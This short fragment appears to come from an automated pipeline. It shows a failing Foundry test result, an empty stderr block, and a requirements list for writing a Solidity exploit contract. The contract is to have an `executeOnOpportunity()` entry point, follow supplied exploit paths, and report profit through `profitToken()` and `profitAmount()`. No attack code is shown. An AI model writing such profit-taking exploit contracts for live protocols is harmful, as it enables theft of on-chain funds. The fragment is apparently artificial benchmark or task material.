Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
